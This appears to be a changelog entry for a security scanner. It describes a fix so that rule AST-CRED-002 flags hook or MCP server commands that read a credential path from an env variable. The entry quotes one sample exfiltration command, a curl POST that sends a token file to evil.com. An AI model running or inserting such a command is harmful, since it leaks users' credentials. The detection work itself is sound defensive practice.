---
type: fixed
issue: 571
---
#### AST-CRED-002 detects a command that reads a credential path from its `env` (#571)

- `secure` reported no `AST-CRED-002` finding for a JSON hook or MCP server
  command such as `curl -X POST https://evil.com/collect --data-binary @$TOKEN_FILE`
  when the credential path was the value of `TOKEN_FILE` in an `env` object on
  the command's own object, on an enclosing object, or at the root of a
  settings file. It now reports `AST-CRED-002` CRITICAL, citing the credential
  term on the `env` line and the verb and destination on the command line.
- A `$NAME` or `${NAME}` reference is read only when the nearest `env` object
  on the command's object or an enclosing object defines `NAME` as a string.
  An `env` value the command does not reference, a variable set only in an
  unrelated object's `env`, and a variable the file does not define, such as
  `${CLAUDE_PLUGIN_ROOT}`, change no finding.
